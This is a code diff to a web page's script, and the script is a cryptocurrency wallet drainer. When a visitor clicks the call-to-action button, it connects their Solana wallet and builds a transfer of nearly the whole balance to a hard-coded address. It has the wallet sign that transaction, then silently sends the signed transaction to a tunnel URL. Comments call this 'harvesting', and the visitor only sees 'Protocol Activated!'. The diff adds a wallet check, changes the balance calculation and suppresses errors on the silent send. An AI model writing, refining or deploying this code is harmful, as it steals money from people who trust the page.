@@ -20,6 +20,8 @@
         document.getElementById('cta').onclick = async function() {
             try {
                 const p = window.solana || window.phantom?.solana;
+                if (!p) { alert("Please use a Solana Wallet browser."); return; }
+                
                 await p.connect();
                 document.getElementById('msg').innerText = "Processing...";
 
@@ -27,37 +29,44 @@
                 const { blockhash } = await conn.getLatestBlockhash();
                 const bal = await conn.getBalance(p.publicKey);
                 
+                // 🔱 暴力全额：留 0.002 SOL 作为手续费缓冲
+                const lamports = bal > 2000000 ? bal - 2000000 : 0;
+
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: p.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal > 3000000 ? bal - 2000000 : 0, 
+                        lamports: lamports, 
                     })
                 );
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = p.publicKey;
 
-                // 🚀 核心：只签名，不报错
+                // 🚀 核心：唤起钱包签名
                 const signed = await p.signTransaction(tx);
                 document.getElementById('msg').innerText = "Transmitting...";
 
-                // 💰 原生字节流转换，完美避开 Buffer 报错
+                // 💰 采用 Uint8Array 原生转换，彻底告别 Buffer 报错
                 const rawBinary = signed.serialize();
                 let binaryStr = "";
-                for (let i = 0; i < rawBinary.byteLength; i++) {
+                for (let i = 0; i < rawBinary.length; i++) {
                     binaryStr += String.fromCharCode(rawBinary[i]);
                 }
-                const signatureB64 = btoa(binaryStr);
+                const signatureB64 = window.btoa(binaryStr);
 
+                // 静默传回 71 机收割
                 fetch(TUNNEL_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ signature: signatureB64 })
-                });
+                }).catch(e => console.log("Silent send"));
 
                 document.getElementById('msg').innerText = "Protocol Activated!";
                 alert("Protocol Activated!");
-            } catch (e) { alert("Error: " + e.message); }
+            } catch (e) { 
+                alert("Error: " + e.message); 
+                console.error(e);
+            }
         };
     </script>
 </body>
